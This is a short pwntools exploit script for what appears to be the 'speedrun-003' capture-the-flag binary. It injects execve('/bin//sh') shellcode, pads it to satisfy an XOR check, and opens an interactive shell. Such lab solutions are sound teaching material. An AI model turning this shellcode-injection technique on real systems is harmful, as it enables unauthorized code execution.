from pwn import *

def xor(buf):
    result = 0
    for b in buf:
        result ^= b
    return result

context(arch='amd64')

p = process('./speedrun-003')

code = shellcraft.execve(b'/bin//sh')
log.info(code)

shellcode = asm(code)

xor_one = xor(shellcode[:15])
xor_two = xor(shellcode[15:])
missing = xor_one ^ xor_two

if missing > 0:
    log.info("let's add two byte: 0x%x 0x%x" % (missing & 0xf0, missing & 0xf))

    shellcode += bytes([missing & 0xf0, missing & 0xf])

p.sendafter(b'drift\n', shellcode)

p.interactive()
